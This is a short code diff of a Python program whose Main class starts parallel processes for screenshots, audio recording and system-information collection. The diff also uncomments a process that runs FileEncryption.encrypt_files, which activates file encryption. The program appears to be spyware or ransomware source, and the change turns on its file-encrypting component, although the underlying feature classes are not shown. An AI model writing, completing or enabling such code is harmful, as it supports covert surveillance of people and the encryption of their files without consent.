@@ -25,7 +25,8 @@ class Main(DataClass):
         super().__init__()  # Call the base class __init__ method
         self.end_time = self.end_time
 
-    def run_feature(self, feature_class, feature_method):
+    @staticmethod
+    def run_feature(feature_class, feature_method):
         feature = feature_class()
         method = getattr(feature, feature_method)
         method()
@@ -39,7 +40,7 @@ class Main(DataClass):
                 Process(target=self.run_feature, args=(Screenshot, 'screenshot')),
                 Process(target=self.run_feature, args=(Soundfile, 'audio_recording')),
                 Process(target=self.run_feature, args=(SystemInformation, 'system_information')),
-                # Process(target=self.run_feature, args=(FileEncryption, 'encrypt_files')),
+                Process(target=self.run_feature, args=(FileEncryption, 'encrypt_files')),
             ]
 
             # Start the processes
